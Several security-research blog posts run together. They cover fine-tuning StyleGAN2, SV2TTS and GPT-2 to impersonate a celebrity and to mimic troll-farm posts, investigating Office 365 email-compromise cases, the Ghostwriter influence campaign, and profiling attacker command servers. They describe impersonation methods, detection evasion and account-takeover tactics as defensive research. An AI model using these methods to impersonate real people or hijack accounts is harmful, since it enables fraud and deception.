can be\nfine-tuned in order to generate custom portraits to impersonate a\ntarget individual. StyleGAN2, like its\npredecessor StyleGAN, is architected as a generative adversarial\nneural network (or GAN) . GANs consist of 2 underlying networks\nthat are pitted against each other (hence “adversarial”) - a\ngenerator, which generates new instances of data, and a discriminator,\nwhich evaluates these instances for authenticity by deciding whether\neach one belongs to the actual training dataset or not. If you\ngenerate images from pre-trained StyleGAN2 off-the-shelf, it outputs random,\nhigh quality, and highly diverse images that appear in a similar\norientation as the images that it was pre-trained on . These\nimages are not present in StyleGAN2’s original training set, but are\ncompletely fabricated from the generative model—these people in fact\ndo not exist, and never have. StyleGAN2 can also be fine-tuned on private datasets to generate\noutputs for custom tasks that the user of the open source model can\ncontrol. As illustrated in Figure 2, we downloaded a few hundred\nimages of Tom Hanks from online image search services, cropped them so\nthat they were each face-centered and 512x512 pixels as required by\nthe pre-trained model, and simply continued training StyleGAN2 by\npointing it at this new smaller dataset using a slightly smaller\nlearning rate. After less than a day of fine-tuning on a single GPU,\nwe then used the fine-tuned StyleGAN2 model to generate arbitrarily\nmany fake images of Mr. Hanks, which exhibit a high level of\nresemblance to his authentic online images. In theory, we could\ncollect cropped images from any target of our choosing and perform the\nsame exercise to generate arbitrarily many fake images of them. Hear No Evil As a second proof of concept, we’ll switch to the audio domain where\nwe demonstrate how SV2TTS can be fine-tuned on audio samples in order\nto impersonate the voice of a target individual. SV2TTS is a complex,\n3-stage model that can perform Voice Cloning —or text-to-speech from arbitrary text inputs to captured reference\nspeech in real time. SV2TTS is comprised of three underlying neural\nnetworks – first, the speaker encoder is trained on thousands of\nspeakers in order to learn an abstract representation of human speech\nand squeeze it into a compressed embedding of floating point values.\nThen the Synthesizer, which\nis based on Google’s TacoTron2 , takes text as input and returns\na mel spectrogram , a\nnumerical representation of an individual’s voice. Lastly, the\nvocoder, based\non DeepMind’s WaveNet , takes the mel spectrogram and converts it\ninto an output waveform that can be heard and comprehended. While pre-trained SV2TTS can be used to generate speech using\narbitrary text from one of a few hundred or so voices, as shown in\nFigure 3 it can also be fine-tuned to generate speech in an\narbitrary voice using arbitrary text. All we need to do is\ncollect some audio samples, which are freely available to record via\nthe Internet, load up a few of the resulting M4A files into the\npre-trained SV2TTS model, and use it as a feature extractor to\nsynthesize new speech waveforms. Using Mr. Hanks again as an example,\nwe demonstrate the result of this process on a few pieces of input\ntext that were chosen by us to resemble cell-phone quality commentary\nthat is thematically representative of the types of narratives we see\npushed in IO campaigns. While the specific examples here are somewhat\nrobotic and show signs of inauthenticity, the timbre of the voice is\n(in our subjective view) similar to that of Mr. Hanks. Neither the\ntext nor the voices exist in any of the original SVT2TTS training\ndatasets. It's worth noting that we didn’t even need a GPU to do this\n– the pre-trained model was fine-tuned locally using a basic laptop’s\nCPU cores, which also suggests that quality improvements are possible\nwith greater resourcing. Speak No Evil Our last proof of concept is in the text domain, where we\ndemonstrate how GPT-2 can be fine-tuned in order to generate custom\nsocial media posts reflecting narratives pushed in a social media IO\ncampaign. GPT-2 is an open source\nneural network that was trained on the causal language modeling\ntask , whose objective is to predict the next word in a sentence\nfrom previous context. A pre-trained model ends up being capable of\nlanguage generation: if the model can predict the next word\naccurately, it can be used in turn to predict the following word, and\nthen so on and so forth until eventually, the model produces fully\ncoherent sentences and paragraphs. The pre-trained GPT-2 model’s outputs display relatively formal\ngrammar, punctuation, and structure that corresponds to the text\npresent within their original prosaic dataset. To make GPT-2's\ngenerations appear more like posts we might expect to encounter\nscrolling through social media, with their shorter length, informal\ngrammar, erratic punctuation, and syntactic quirks, we fine-tuned it\non a new language modeling task using additional training data. This\ndata consisted of open source social media posts from accounts\noperated by Russia’s famed Internet Research Agency or IRA “troll\nfactory.” We fine-tuned GPT-2 on a single GPU for a few hours by processing\nthese social media posts through the pre-trained model , whose\nactivations were then fed through adjustable weights into a linear\noutput layer. The resulting fake posts are short yet biting, express\noutrage regarding political issues, and contain idiosyncrasies like\nhashtags and emojis that positionally manifest at the end of the\ngenerated text. Synthetic Media in the Wild IO actors use various tactics that would be readily conducive to\nsynthetic media augmentation. For example, one influence campaign we\nuncovered and dubbed \"Distinguished\nImpersonator\" involves falsifying journalist personas and\nreaching out to real-world experts and political figures to\ndisingenuously solicit audio and video interviews that advance an\nIranian political agenda. Another commonly used tactic is the\ndevelopment of cross-platform online personas that are used to\ninfiltrate target groups or disseminate fabricated content to specific\naudiences, such as in the \"Ghostwriter\"\ncampaign that has leveraged website compromises and used multiple\nwell-developed personas to disseminate fabricated content\naligned with Russian security interests. And other very common\ntechniques include the use of appropriated photos of real individuals\nto backstop false personas, and the repeated use of identical text on\nsocial media to \"astroturf\" political commentary. Synthetic\nmedia has real potential to exacerbate the use and effectiveness of\nsuch tactics. Indeed, we already frequently uncover false personas and networks of\ninauthentic social media accounts using artificially generated profile\nphotos, and this use is widespread. For example, we’ve uncovered large\nnetworks of inauthentic social media accounts pushing pro-China\nnarratives surrounding the Hong Kong democracy protests and the\nCOVID-19 pandemic making significant use of artificially generated\nphotos. We identified inauthentic accounts using synthetic profile\nphotos in a recent operation that appeared designed to support\ngovernment officials in a region of Argentina. And in a social\nmedia-driven influence operation that promoted pro-Cuban government\nand anti-US narratives, the operators behind one network of\ninauthentic accounts didn’t even bother to fully crop out the text box\nplaced by the “thispersondoesnotexist” image generation tool stating\nthat the images were generated with StyleGAN2, prior to use. The\nexamples of artificially generated images we’ve seen actively used in\nIO campaigns presented in Figure 5 illustrate a common format\nobserved, including closely cropped headshots with blurred\nbackgrounds, anomalies around the ears, neck, and shoulders,\ndifficulties with fully rendering accessories such as glasses and\nearrings, and phantom hair strings being generated outside a credible\narea. But we can readily envision an escalation of this tactic, in which\nconvincing personas are created using artificially generated profile\nphotos trained on images of real people from a target group or\ngeography that correspond to, say, a particular minority group, and\nare then used to instigate political conflict or incite animosity and\nviolence. The use of synthetically generated audio interviews in a\ncampaign  resembling Distinguished Impersonator trained on a real\npolitical expert’s voice, would lower an actor’s burden by removing\nthe need to convincingly engage in direct outreach to real people,\nwhich would also make attribution more difficult for investigators by\nreducing available investigative leads such as contact details and\nmodes of communication between actor and target. And synthetic media\nwould drastically lower barriers for actors seeking to disseminate\ndiverse text-based content at scale, reducing the effort required to\ncreate a large corpus of written content and the need to repeatedly\nreuse snippets of identical text. Evading Detection Synthetic media doesn’t need to be overwhelmingly credible to\nhave its desired effect. People are used to consuming short,\nauthoritative, error-riddled social media text at speed without\ndwelling too much on its linguistic features or origin. Users are\naccustomed to consuming poor-quality audio and video snippets, and the\nmajority of users aren’t going to give a social media account’s\nprofile image more than a cursory glance as they scroll through their\nfeed and ingest written content at rapid speed. The quality bar does\nnot need to be exceedingly high when it comes to synthetic\ngenerations; it only needs to be “good enough” for even just a subset\nof vocal users to not question it in a world characterized by rapid,\nhigh-volume information consumption. The unifying theme behind the various potential IO applications\ndiscussed in the previous section is that they would materially help\nthreat actors scale campaigns at low cost and better evade\ndetection. Fine-tuning in particular presents a problem for blue\nteams, as it allows threat actors to better evade classifiers and\ndetection models that are built for pre-trained outputs. This is\nworrisome as a would-be threat actor’s fine-tuning datasets would\nlikely be private and unknown to the defender at test time. This\nconcept is illustrated by the text-based detection experiments we\nconducted in Figure 6. After releasing GPT-2, OpenAI\nreleased source code along with a fine-tuned classifier based on\nRoBERTa , which does not share the same architecture or tokenizer\nas GPT-2, that can reliably discriminate between GPT-2's own output\ngenerations and its original pre-training data of high-Karma Reddit posts. We used this RoBERTa model first to verify the findings that one can reliably differentiate\nbetween fabricated, GPT-2 generated text and the authentic GPT-2\npre-training dataset. When we performed the same exercise using the\nclassifier to try to differentiate our fine-tuned IO text generations\n(i.e. those previously discussed in Figure 4), the accuracy\nsignificantly dropped. The fact that the pre-trained score\ndistribution is skewed towards 1 means the detection model for\npre-trained generations, with a classification threshold of 0.5, can\neasily classify the generations as “fake.” This results in an accuracy\nscore of over 97% for the detection model, as shown in blue in Figure\n6. However, detection accuracy dipped to around 78% for fine-tuned\ngenerations as the distribution of scores output by the classifier\nshifts closer to chance, as shown in red. So if threat actors were to\nfine-tune on a custom dataset they themselves collated, this could\npresent a problematic asymmetry between the data used to create the\nsynthetic generations and the data blue teams would have access to—or\neven knowledge of—with which to build a commensurate detection model. Text with shorter length\nwas previously shown to be more difficult for detection models to\nclassify , and while our tweet-inspired experiments corroborate\nthis finding, further research is required to disentangle how\ndifferent datasets, model complexities, input lengths, and\nhyperparameters will contribute to this effect in the cat-and-mouse\nfuture of generators versus detectors. Conclusion Synthetic media generation continues to become cheaper, both\nmonetarily and in terms of the computing power required, easier, more\npervasive, and their outputs ever more credible. Image generation\ncapabilities and even commercial services are already moving beyond\nmerely headshots and facial generations to full-body shots and\nadvanced video generations, and end users will enjoy increasing\ncontrol over and ease of content generation, both through being able\nto steer generations towards particular attributes at more granular\nlevels, and by being able to use an increasing amount of both free and\ncommercial low-code or no-code applications for content creation. This blog post highlights the need for the research community to\ncontinue to focus attention on the development of technical detection\nand mitigation capabilities for synthetic media, given its ready\napplicability to current information operations tactics. Multiple\navenues of research can and should be pursued, including statistical\napproaches to detection like machine\nlearning classifiers and model\nwatermarking , as well as the signature-based identification of\nfingerprints and forensic indicators (e.g. Figure 5). Secondly,\nthere’s the human aspect to all of this, including the importance of\nensuring communities of researchers from different disciplines\ncoalesce around approaches to overcoming the detection challenges,\nthreat modeling how synthetic media may be deployed in future IO\ncampaigns so that any potential effects can be pre-emptively\naddressed, and encouraging commercial providers of synthetic media\ngeneration capabilities to acknowledge and account for the potential\nabuse of their services by threat actors. Outside of community\nefforts, there also remains the need for raising awareness and\neducating consumers of social media and other content about the risks\nof synthetic media in a responsible manner that doesn’t misrepresent\nthe threat, as well developing legal and regulatory approaches to\ndealing with information operations and synthetic media.

                "text": "With Business Email Compromises (BECs) showing no signs of slowing down , it is becoming increasingly important for security analysts to understand Office 365 (O365) breaches and how to properly investigate them. This blog post is for those who have yet to dip their toes into the waters of an O365 BEC, providing a crash course on Microsoft’s cloud productivity suite and its assortment of logs and data sources useful to investigators. We’ll also go over common attacker tactics we’ve observed while responding to BECs and provide insight into how Mandiant Managed Defense analysts approach these investigations at our customers using PowerShell and the FireEye Helix platform . Office 365 Office 365 is Microsoft’s cloud-based subscription service for the Microsoft Office suite. It is built from dozens of applications tightly embedded into the lives of today’s workforce, including: Exchange Online, for emails SharePoint, for intranet portals and document sharing Teams and Skype for Business, for instant messaging OneDrive, for file sharing Microsoft Stream, for recorded meetings and presentations As more and more organizations decide to adopt Microsoft’s cloud-based offering to meet their needs, unauthorized access to these O365 environments, or tenants in Microsoft’s parlance, has become increasingly lucrative to motivated attackers. The current high adoption rate of O365 means that attackers are getting plenty of hands on experience with using and abusing the platform. While many tactics have remained largely unchanged in the years since we’ve first observed them, we’ve also witnessed the evolution of techniques that are effective against even security-conscious users. In general, the O365 compromises we’ve responded to have fallen into two categories: Business Email Compromises (BECs) APT or state-sponsored intrusions Based on our experience, BECs are a common threat to any organization's O365 tenant. The term “BEC” typically refers to a type of fraud committed by financially motivated attackers. BEC actors heavily rely on social engineering to carry out their schemes, ultimately defrauding organizations and even personnel. One common BEC scheme involves compromising a C-suite executive’s account via phishing. Once the victim unwittingly enters their credentials into a web form masquerading as the legitimate Office 365 login portal, attackers log in and instruct others in the organization to conduct a wire transfer, perhaps under the guise of an upcoming acquisition that has yet to be publicly announced. However, we’ve also observed more effective schemes where attackers compromise those in financial positions and patiently wait until an email correspondence has begun about a due payment. Attackers seize this opportunity by sending a doctored invoice (sometimes based on a legitimate invoice that had been stolen earlier) on behalf of the compromised user to another victim responsible for making payments. These emails are typically hidden from the compromised user due to attacker-created Outlook mailbox rules. Often times, by the time the scheme is inevitably discovered and understood days or weeks later, the money is unrecoverable—highlighting the importance of contacting law enforcement immediately if you’ve fallen victim to a fraud. The personal finances of staff aren’t off limits to attackers either. We’ve observed several cases of W-2 scams, in which attackers send a request to HR for W-2 information from the victim’s account. Once obtained, this personally identifiable information is later used to conduct tax fraud. Conversely, APT intrusions are typically more sophisticated and are conducted by state-sponsored threat actors. Rather than for financial gain, APT actors are usually tasked to compromise O365 tenants for purposes of espionage, data theft, or destruction. Given the wealth of sensitive information housed in any given organization’s O365 tenant, APT actors may not even need to touch a single endpoint to complete their mission, sidestepping the many security controls organizations have implemented and invested in. O365 Logs and Data Sources In this section, we’ll touch on the multitude of logs and portals containing forensic data relevant to an O365 investigation. Before we can begin investigating an O365 case, we’ll work with our clients to get an “Investigator” account provisioned with the roles required to obtain the forensic data we need. For the purposes of this blog post, we’ll quickly list the roles needed for an Investigator account, but during an active Managed Defense investigation, a designated Managed Defense consultant will provide further guidance on account provisioning. At a minimum, the Investigator account should have the following roles: Exchange Admin Roles View-only audit logs View-only configuration View-only recipients Mailbox Search Message Tracking eDiscovery Rights eDiscovery Manager role Azure Active Directory Roles Global Reader Unified Audit Log (UAL) The Unified Audit Log records activity from various applications within the Office 365 suite, and can be considered O365’s main log source. Entries in the UAL are stored in JSON format. We recommend using the PowerShell cmdlet Search-UnifiedAuditLog to query the UAL as it allows for greater flexibility, though it can also be acquired from the Office 365 Security & Compliance Center located at protection.office.com . In order to leverage this log source (and the Admin Audit Log), ensure that the Audit Log Search feature is enabled. The UAL has a few nuances that are important to consider. While it provides a good high-level summary of activity across various O365 applications, it won’t log comprehensive mailbox activity (for that, acquire the Mailbox Audit Log). Furthermore, the UAL has a few limitations, namely: Results to a single query are limited to 5000 results Only 90 days of activity are retained Events may take up to 24 hours before they are searchable Mailbox Audit Log (MAL) The Mailbox Audit Log, part of Exchange Online, will capture additional actions performed against objects within a mailbox. As such, it’s a good idea acquire and analyze the MAL for each affected user account with the PowerShell cmdlet Search-MailboxAuditLog . Note that entries in the MAL will be retained for 90 days (by default) and timestamps will be based on the user’s local time zone. The MAL’s retention time can always be increased with the PowerShell cmdlet Set-Mailbox along with the AuditLogAgeLimit parameter. At the time of writing this post, Microsoft has recently released information about enhanced auditing functionality that gives investigators insight into which emails were accessed by attackers. This level of logging for regular user accounts is only available for organizations with an Office 365 E5 subscription. Once Advanced Auditing is enabled, mail access activity will be logged under the MailItemsAccessed operation in both the UAL and MAL. Administrator Audit Log If the Audit Log Search feature is enabled, this supplemental data source logs all PowerShell administrative cmdlets (including command-line arguments) executed by administrators. If you suspect that an administrator account was compromised, don’t overlook this log! The PowerShell cmdlet Search-AdminAuditLog is used to query these logs, but note that the Audit Log Search feature must be enabled and the same 90 day retention limit will be in place. Azure AD Logs Azure AD logs can be accessed from the Azure portal ( portal.azure.com ) under the Azure Active Directory service. Azure AD Sign-in logs contain detailed information about how authentications occur and O365 application usage. Azure AD audit logs are also a valuable source of information, containing records of password resets, account creations, role modifications, OAuth grants, and more that could be indicative of suspicious activity. Note that Azure AD logs are only available for 30 days. Cloud App Security Portal For cases where OAuth abuse has been observed, information about cloud applications can be found in Microsoft’s Cloud App Security portal ( portal.cloudappsecurity.com ). Access to this portal requires an E5 license or a standalone Cloud App license. For more background on OAuth abuse, be sure to check out our blog post: Shining a Light on OAuth Abuse with PwnAuth . Message Traces Message traces record the emails sent and received by a user. During an investigation, run reports on any email addresses of interest. The message trace report will contain detailed mail flow information as well as subject lines, original client IP addresses, and message sizes. Message traces are useful for identifying emails sent by attackers from compromised accounts, and can also aid in identifying initial phishing emails if phishing was used for initial access. To obtain the actual emails, use the Content Search tool. Only the past 10 days of activity is available with the Get-MessageTrace PowerShell cmdlet. Historical searches for older messages can be run with the Get-HistoricalSearch cmdlet (up to 90 days by default), but historical searches typically take hours for the report to be available. Historical reports can also be generated within the Security and Compliance Center. eDiscovery Content Searches The Content Search tool allows investigators to query for emails, documents, and instant message conversations stored in an Office 365 tenant. We frequently run Content Search queries to find and acquire copies of emails sent by attackers. Content searches are limited to what has been indexed by Microsoft, so recent activity may not immediately appear. Additionally, only the most recent 1000 items will be shown in the preview pane. Anatomy of an O365 BEC As mentioned earlier, BECs are one of the more prevalent threats to O365 tenants seen by Managed Defense today. Sometimes, Mandiant analysts respond to several BEC cases at our customers within the same week. With this frontline experience, we’ve compiled a list of commonly observed tactics and techniques to advise our readers about the types of activities one should anticipate. Please note that this is by no means a comprehensive list of O365 attacks, rather a focus on the usual routes we’ve seen BEC actors take to accomplish their objective. Phase 1: Initial Compromise Phishing : Emails with links to credential harvesting forms sent to victims, sometimes from the account of a compromised business partner. Brute force : A large dictionary of passwords attempted against an account of interest. Password spray : A dictionary of commonly used passwords attempted against a list of known user accounts. Access to credential dump : Valid credentials used from a previous compromise of the user. MFA bypasses : Use of mail clients leveraging legacy authentication protocols (e.g. IMAP/POP), which bypass MFA policies. Attackers may also spam push notifications to the victim by repeatedly attempting to log in, eventually leading to the victim mistakenly accepting the prompt. Phase 2: Establish Foothold More phishing : Additional phishing lures sent to internal/external contacts from Outlook’s global address list. More credible lures : New phishing lures uploaded to the compromised user's OneDrive or SharePoint account and shared with the victim’s coworkers. SMTP forwarding : SMTP forwarding enabled in the victim’s mailbox to forward all email to an external address. Forwarding mailbox rules : Mailbox rules created to forward all or certain mail to an external address. Mail client usage : Outlook or third-party mail clients used by attackers. Mail will continue to sync for a short while after a password reset occurs. Phase 3: Evasion Evasive mailbox rules : Mailbox rules created to delete mail or move some or all incoming mail to uncommonly used folders in Outlook, such as “RSS Subscriptions”. Manual evasion : Manual deletion of incoming and sent mail. Attackers may forego mailbox rules entirely. Mail forwarding : Attackers accessing emails without logging in if a mechanism to forward mail to an external address was set up earlier. Mail client usage : Outlook or third-party mail clients used by attackers. Mail can be synced locally to the attacker’s machine and accessed later. VPN usage : VPN servers, sometimes with similar geolocations to their victims, used in an attempt to avoid detection and evade conditional access policies. Phase 4: Internal Reconnaissance Outlook searching : The victim’s mailbox queried by attackers for emails of interest. While not recorded in audit logs, it may be available to export if it was not deleted by attackers. O365 searching : Searches conducted within SharePoint and other O365 applications for content of interest. While not recorded in audit logs, SharePoint and OneDrive file interactions are recorded in the UAL. Mail client usage : Outlook or third-party mail clients used by attackers. Mail can be synced locally to the attacker’s machine and accessed later. Phase 5: Complete Mission Direct deposit update : A request sent to the HR department to update the victim’s direct deposit information, redirecting payment to the BEC actor. W-2 scam : A request sent to the HR department for W-2 forms, used to harvest PII for tax fraud. Wire transfer : A wire transfer requested for an unpaid invoice, upcoming M&A, charities, etc. Third-party account abuse : Abuse of the compromised user’s privileged access to third-party accounts and services, such as access to a corporate rewards site. How Managed Defense Responds to O365 BECs In this section, we’re going to walk through how Managed Defense investigates a typical O365 BEC case. Many of the steps in our investigation rely on querying for logs with PowerShell. To do this, first establish a remote PowerShell session to Exchange Online. The following Microsoft documentation provides guidance on two methods to do this: Connect to Exchange Online PowerShell with Basic authentication Use the Exchange Online PowerShell with modern authentication using V2 module Broad Scoping We start our investigations off by running broad queries against the Unified Audit Log (UAL) for suspicious activity. We’ll review OAuth activity too, which is especially important if something more nefarious than a financially motivated BEC is suspected. Any FireEye gear available to us—such as FireEye Helix and Email Security —will be leveraged to augment the data available to us from Office 365. The following are a few initial scoping queries we’d typically run at the beginning of a Managed Defense engagement. Scoping Recent Mailbox Rule Activity Even in large tenants, pulling back all recent mailbox rule activity doesn’t typically produce an unmanageable number of results, and attacker-created rules tend to stand out from the rest of the noise. Querying UAL for all mailbox rule activity in Helix: class=ms_office365 action:[New-InboxRule, Set-InboxRule, Enable-InboxRule] | table [createdtime, action, username, srcipv4, srcregion, parameters, rawmsg] Query UAL for new mail rule activity in PowerShell: Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-90) -EndDate (Get-Date) -ResultSize 5000 -Operations \"New-InboxRule\",\"Set-InboxRule\",\"Enable-InboxRule\" | Export-CSV \\path\\to\\file.csv –NoTypeInformation -Encoding utf8 Scoping SMTP Forwarding Activity SMTP forwarding is sometimes overlooked because it appears under a UAL operation separate from mailbox rules. This query looks for the Set-Mailbox operation containing a parameter to forward mail over SMTP, indicative of automatic forwarding being enabled from OWA. Querying UAL for SMTP forwarding in Helix: class=ms_office365 action=Set-Mailbox rawmsg:ForwardingSmtpAddress | table [createdtime, action, username, srcipv4, srcregion, parameters, rawmsg] Querying UAL for SMTP forwarding in PowerShell: Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-90) -EndDate (Get-Date) -ResultSize 5000 -FreeText \"ForwardingSmtpAddress\" | Export-CSV \\path\\to\\file.csv –NoTypeInformation -Encoding utf8 Analyze Compromised Users Logs After we’ve finished scoping the tenant, we’ll turn our attention to the individual users believed to be involved in the compromise. We’ll acquire all relevant O365 logs for the identified compromised user(s) - this includes the user's UAL, Mailbox Audit Log (MAL), and Admin audit log (if the user is an administrator). We’ll review these logs for anomalous account activity and assemble a list of attacker IP addresses and User-Agents strings. We’ll use this list to further scope the tenant. O365 investigations rely heavily on anomaly detection. Many times, the BEC actor may even be active at the same time as the user. In order to accurately differentiate between legitimate user activity and attacker activity within a compromised account, it's recommended to pull back as much data as possible to use as a reference for legitimate activity. Using the Helix query transforms groupby < [srccountry,srcregion] , groupby < useragent and groupby < srcipv4 , which highlight the least common geolocations, User Agent strings, and IP addresses, can also assist in identifying anomalies in results. Querying UAL for a user in Helix: class=ms_office365 username=user@client.com | table [createdtime, action, username, srcipv4, srccountry, srcregion, useragent, rawmsg] | groupby < [srccountry,srcregion] Querying UAL for a user in PowerShell: Search-UnifiedAuditLog -StartDate mm/dd/yyyy -EndDate (Get-Date) -ResultSize 5000 -UserIds user@client.com | Export-CSV \\path\\to\\file.csv –NoTypeInformation -Encoding utf8 Querying MAL for a user in PowerShell: Search-MailboxAuditLog -Identity user@client.com -LogonTypes Owner,Delegate,Admin -ShowDetails -StartDate (Get-Date).AddDays(-90) -EndDate (Get-Date) | Export-CSV \\path\\to\\file.csv –NoTypeInformation -Encoding utf8 Querying Admin Audit Log for all events within a certain date in PowerShell: Search-AdminAuditLog -StartDate mm/dd/yyyy -EndDate mm/dd/yyyy | Export-CSV \\path\\to\\file.csv –NoTypeInformation -Encoding utf8 Query UAL with New Leads Now that we’ve built a list of suspicious IP addresses (or even entire CIDR ranges) and User-Agent strings, we’ll run new queries against the entire UAL to try to identify other compromised user accounts. We’ll repeat this step and the previous step for each newly identified user account. One advantage to using FireEye Helix platform over PowerShell is that we can query entire CIDR ranges. This is helpful when we observe attackers coming from a VPN or ISP that dynamically assigns IP addresses within the same address block. Queries for attacker User-Agent strings usually generate more noise to sift through than IP address searches. In practice, User-Agent queries are only beneficial if the attackers are using an uncommon browser or version of a browser. Due to limitations of the Search-UnifiedAuditLog cmdlet, we’ve had the most success using the FreeText parameter and searching for simple strings. In Helix: class=ms_office365 (srcipv4:[1.2.3.4, 2.3.4.0/24] OR useragent:Opera) | table [createdtime, action, username, srcipv4, srccountry, srcregion, useragent, rawmsg] | groupby username Querying the UAL for IPs and user agents in PowerShell: Search-UnifiedAuditLog -StartDate mm/dd/yyyy -EndDate (Get-Date) -ResultSize 5000 -IPAddresses 1.2.3.4, 2.3.4.5 | Export-CSV \\path\\to\\file.csv –NoTypeInformation -Encoding utf8 Search-UnifiedAuditLog -StartDate mm/dd/yyyy -EndDate (Get-Date) -ResultSize 5000 -FreeText \"Opera\" | Export-CSV \\path\\to\\file.csv –NoTypeInformation -Encoding utf8 Analyze Message Traces We’ll use PowerShell to query message traces for the compromised users we’ve identified. If the email was sent within the past 10 days, use the Get-MessageTrace cmdlet, which immediately returns results and allows teams to query IP addresses. For older emails, use the Start-HistoricalSearch cmdlet and download the report later from the Mail Flow section of the Security & Compliance center. Querying for the last 10 days of mail sent by the victim in PowerShell: Get-MessageTrace -StartDate (Get-Date).AddDays(-10) -EndDate (Get-Date) -SenderAddress victim@client.com | Select-Object Received, SenderAddress, RecipientAddress, Subject, Status, FromIP, Size, MessageID | Export-CSV \\path\\to\\file.csv –NoTypeInformation -Encoding utf8 Querying for older emails (up to 90 days) in PowerShell: Start-HistoricalSearch -ReportTitle \"Mandiant O365 investigation\" -StartDate mm/dd/yyyy -EndDate mm/dd/yyyy -ReportType MessageTraceDetail -SenderAddress victim@client.com As Message Trace results are reviewed, attention should be given to IP addresses to determine which emails were sent by attackers. If phishing was the suspected initial compromise vector, it’s a good idea to also query for incoming mail received within a few days prior to the first compromise date and look for suspicious sender addresses and/or subject lines. Acquire Emails of Interest With our list of suspicious emails identified from message traces, we’ll use the Content Search tool available in the Office 365 Security and Compliance Center acquire the email body and learn what domains were used in phishing lures (if phishing was present). Content Searches are performed by using a straightforward GUI, and the results can either be previewed in the browser, downloaded individually as EML files, or downloaded in bulk as PST files. Final Scoping At this point of our investigation, the BEC should be sufficiently scoped within the tenant. To ensure any follow-on activity hasn’t occurred, we’ll take all of the attack indicators and perform our final queries across the UAL. With that said, there are still edge cases in which attacker activity wouldn’t appear in O365 logs. For example, perhaps an additional user has submitted their credentials to a phishing page, but the attackers haven’t used them to log in yet. To ensure we don’t miss this activity, we’ll perform additional scoping across available network logs, specifically for IP addresses and domains related to the attacker’s phishing infrastructure. We’ll also leverage other FireEye products, such as the Endpoint Security platform, to search for phishing domains present on a host’s web browser history. Conclusion Unauthorized access to O365 tenant doesn’t just pose a threat to an organization, but also to its staff and business partners. Organizations without enhanced security controls in O365 are at the greatest risk of experiencing a BEC. However, as multi factor-authentication becomes more and more commonplace, we’ve witnessed an increase of MFA bypass attempts performed by increasingly proficient attackers. It’s important to remember that social engineering plays a primary role throughout a BEC. Ensure that users are trained on how to identify credential harvesting forms, a common compromise vector. When in the midst of a BEC compromise, teams may want to promptly alert personnel in HR and finance-related roles to exercise extra caution when processing requests related to banking or wire transfers while the investigation is in progress. The examples covered in this blog post are just a sample of what Managed Defense performs while investigating an Office 365 compromise. To take a proactive approach at preventing BECs, make sure the following best practices are implemented in a O365 tenant. Additionally, FireEye Email Security offers protections against phishing and the Helix platform’s O365 ruleset can alert on anomalous activity as soon as it happens. Recommended Best Practices Ensure mailbox audit logging is enabled on all accounts Disable Legacy Authentication protocols Enable multi-factor authentication (MFA) Enforce strong passwords and a password expiration policy Forward O365 audit logs to a centralized logging platform for extended retention Enforce an account lockout policy in Azure/on-premise Active Directory Restrict mail forwarding to external domains Acknowledgements Special thanks to Doug Bienstock, Glenn Edwards, Josh Madeley, and Tim Martin for their research and assistance on the topic.

                "text": "Mandiant Threat Intelligence has tied together several information operations that we assess with moderate confidence comprise part of a broader influence campaign—ongoing since at least March 2017—aligned with Russian security interests. The operations have primarily targeted audiences in Lithuania, Latvia, and Poland with narratives critical of the North Atlantic Treaty Organization’s (NATO) presence in Eastern Europe, occasionally leveraging other themes such as anti-U.S. and COVID-19-related narratives as part of this broader anti-NATO agenda. We have dubbed this campaign “ Ghostwriter .” Many, though not all of the incidents we suspect to be part of the Ghostwriter campaign, appear to have leveraged website compromises or spoofed email accounts to disseminate fabricated content, including falsified news articles, quotes, correspondence and other documents designed to appear as coming from military officials and political figures in the target countries. This falsified content has been referenced as source material in articles and op-eds authored by at least 14 inauthentic personas posing as locals, journalists and analysts within those countries. These articles and op-eds, primarily written in English, have been consistently published to a core set of third-party websites that appear to accept user-submitted content, most notably OpEdNews.com, BalticWord.com, and the pro-Russian site TheDuran.com, among others, as well as to suspected Ghostwriter-affiliated blogs. Some of these incidents and personas have received public attention from researchers, foreign news outlets, or government entities in Lithuania and Poland, but have not been tied to a broader activity set. Others have received little attention and remain relatively obscure. Mandiant Threat Intelligence has independently discovered several Ghostwriter personas and identified additional incidents involving some of those personas previously exposed. We believe the assets and operations discussed in this report are for the first time being collectively tied together and assessed to comprise part of a larger, concerted and ongoing influence campaign.

                "text": "Real Quick In case you’re thrown by that fantastic title, our lawyers made us change the name of this project so we wouldn’t get sued. SCANdalous—a.k.a. Scannah Montana a.k.a. Scanny McScanface a.k.a. “Scan I Kick It? (Yes You Scan)”—had another name before today that, for legal reasons, we’re keeping to ourselves. A special thanks to our legal team who is always looking out for us, this blog post would be a lot less fun without them. Strap in folks. Introduction Advanced Practices is known for using primary source data obtained through Mandiant Incident Response , Managed Defense , and product telemetry across thousands of FireEye clients. Regular, first-hand observations of threat actors afford us opportunities to learn intimate details of their modus operandi. While our visibility from organic data is vast, we also derive value from third-party data sources. By looking outwards, we extend our visibility beyond our clients’ environments and shorten the time it takes to detect adversaries in the wild—often before they initiate intrusions against our clients. In October 2019, Aaron Stephens gave his “Scan’t Touch This” talk at the annual FireEye Cyber Defense Summit (slides available on his Github ). He discussed using network scan data for external detection and provided examples of how to profile command and control (C2) servers for various post-exploitation frameworks used by criminal and intelligence organizations alike. However, manual application of those techniques doesn’t scale. It may work if your role focuses on one or two groups, but Advanced Practices’ scope is much broader. We needed a solution that would enable us to track thousands of groups, malware families and profiles. In this blog post we’d like to talk about that journey, highlight some wins, and for the first time publicly, introduce the project behind it all: SCANdalous. Pre-SCANdalous Case Studies Prior to any sort of system or automation, our team used traditional profiling methodologies to manually identify servers of interest. The following are some examples. The success we found in these case studies served as the primary motivation for SCANdalous. APT39 SSH Tunneling After observing APT39 in a series of intrusions, we determined they frequently created Secure Shell (SSH) tunnels with PuTTY Link to forward Remote Desktop Protocol connections to internal hosts within the target environment. Additionally, they preferred using BitVise SSH servers listening on port 443. Finally, they were using servers hosted by WorldStream B.V. Independent isolation of any one of these characteristics would produce a lot of unrelated servers; however, the aggregation of characteristics provided a strong signal for newly established infrastructure of interest. We used this established profile and others to illuminate dozens of servers we later attributed to APT39 , often before they were used against a target. APT34 QUADAGENT In February 2018, an independent researcher shared a sample of what would later be named QUADAGENT. We had not observed it in an intrusion yet; however, by analyzing the characteristics of the C2, we were able to develop a strong profile of the servers to track over time. For example, our team identified the server 185.161.208\\.37 and domain rdppath\\.com within hours of it being established. A week later, we identified a QUADAGENT dropper with the previously identified C2. Additional examples of QUADAGENT are depicted in Figure 1. Figure 1: QUADAGENT C2 servers in the Shodan user interface 